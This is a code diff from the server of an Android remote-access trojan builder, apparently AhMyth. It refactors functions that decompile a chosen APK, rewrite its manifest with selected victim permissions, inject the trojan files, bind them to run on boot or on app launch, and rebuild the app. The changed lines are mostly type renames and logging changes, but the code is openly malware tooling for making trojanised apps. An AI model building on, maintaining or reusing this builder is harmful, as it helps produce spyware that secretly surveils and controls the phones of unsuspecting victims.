@@ -32,7 +32,7 @@ import {
     type IReceiver,
 } from '../../common/interfaces';
 import { config } from '../config';
-import { type PayloadEntity, PayloadLogEntity } from '../entities';
+import { PayloadLogModel, type PayloadModel } from '../database';
 import { logger } from '../logger';
 import { SocketService } from '../services';
 
@@ -168,7 +168,7 @@ const getSocketService = (): SocketService => {
     return socketService;
 };
 
-const payloadSucceeded = async (payload: PayloadEntity): Promise<void> => {
+const payloadSucceeded = async (payload: PayloadModel): Promise<void> => {
     payload.status = PayloadStatus.SUCCESS;
     await payload.save();
 
@@ -179,7 +179,7 @@ const payloadSucceeded = async (payload: PayloadEntity): Promise<void> => {
 };
 
 const execStage = async <T>(
-    payload: PayloadEntity,
+    payload: PayloadModel,
     message: string,
     callback: (
         updateStatus: (
@@ -188,9 +188,11 @@ const execStage = async <T>(
         ) => Promise<void>,
     ) => T | Promise<T>,
 ): Promise<T> => {
-    const log = new PayloadLogEntity(message, payload);
-
-    await log.save();
+    const log = await PayloadLogModel.create({
+        payloadId: payload.id,
+        message,
+        status: PayloadLogStatus.INPROGRESS,
+    });
 
     getSocketService().payloadsRoom.emit(
         ServerToWebEvents.PAYLOAD_LOG_ADDED,
@@ -293,7 +295,7 @@ const checkJavaVersion = async (): Promise<number> => {
     });
 };
 
-const getSelectedPermissions = (payload: PayloadEntity): string[] =>
+const getSelectedPermissions = (payload: PayloadModel): string[] =>
     payload.permissions.length === 0 ||
     payload.permissions.length === Object.values(VictimOrder).length
         ? defaultPermissions
@@ -304,7 +306,7 @@ const getSelectedPermissions = (payload: PayloadEntity): string[] =>
               .filter((item, index, array) => array.indexOf(item) === index);
 
 const generateApk = async (
-    payload: PayloadEntity,
+    payload: PayloadModel,
     apkFolder: string,
 ): Promise<void> => {
     await execStage(
@@ -487,7 +489,7 @@ const generateApk = async (
 };
 
 const modifyManifest = async (
-    payload: PayloadEntity,
+    payload: PayloadModel,
     data: string,
 ): Promise<string | null> => {
     const selectedPermissions = await execStage(
@@ -722,7 +724,7 @@ const modifyManifest = async (
 };
 
 const getLauncherActivity = async (
-    payload: PayloadEntity,
+    payload: PayloadModel,
     manifest: IAndroidManifest,
 ): Promise<string | null> => {
     return await execStage<string | null>(
@@ -887,7 +889,7 @@ const getLauncherActivity = async (
 };
 
 const getLauncherPath = async (
-    payload: PayloadEntity,
+    payload: PayloadModel,
     launcherActivity: string,
     apkFolder: string,
 ): Promise<string | null> => {
@@ -968,7 +970,7 @@ const createPayloadDirectory = (files: Dirent[]): string | null => {
 };
 
 const injectAhmythFilesAndGenerateApk = async (
-    payload: PayloadEntity,
+    payload: PayloadModel,
     apkFolder: string,
 ): Promise<void> => {
     const targetFiles = await execStage<Dirent[] | null>(
@@ -1216,7 +1218,7 @@ const injectAhmythFilesAndGenerateApk = async (
 };
 
 const bindOnBoot = async (
-    payload: PayloadEntity,
+    payload: PayloadModel,
     apkFolder: string,
     modifiedXml: string,
 ): Promise<void> => {
@@ -1266,7 +1268,7 @@ const bindOnBoot = async (
 };
 
 const bindOnActivity = async (
-    payload: PayloadEntity,
+    payload: PayloadModel,
     apkFolder: string,
     modifiedXml: string,
 ): Promise<void> => {
@@ -1675,7 +1677,7 @@ const bindOnActivity = async (
     await injectAhmythFilesAndGenerateApk(payload, apkFolder);
 };
 
-const buildBinded = async (payload: PayloadEntity): Promise<void> => {
+const buildBinded = async (payload: PayloadModel): Promise<void> => {
     const apkFolder = await execStage<string | null>(
         payload,
         'Decompiling the APK using apktool...',
@@ -1693,7 +1695,7 @@ const buildBinded = async (payload: PayloadEntity): Promise<void> => {
                 const decompileApk = `java -jar "${apktoolJar}" d "${resolve(
                     process.cwd(),
                     config.APK_UPLOAD_PATH,
-                    payload.existingAPK ?? '',
+                    `${payload.id}.apk`,
                 )}" -f -o "${apkFolder}"`;
 
                 await execCommand(decompileApk);
@@ -1773,7 +1775,7 @@ const buildBinded = async (payload: PayloadEntity): Promise<void> => {
     }
 };
 
-const buildStandalone = async (payload: PayloadEntity): Promise<void> => {
+const buildStandalone = async (payload: PayloadModel): Promise<void> => {
     const selectedPermissions = await execStage(
         payload,
         'Building permissions list...',
@@ -1878,7 +1880,7 @@ const buildStandalone = async (payload: PayloadEntity): Promise<void> => {
     await generateApk(payload, extractedPath);
 };
 
-export const buildAPK = async (payload: PayloadEntity): Promise<void> => {
+export const buildAPK = async (payload: PayloadModel): Promise<void> => {
     try {
         payload.status = PayloadStatus.INPROGRESS;
         await payload.save();
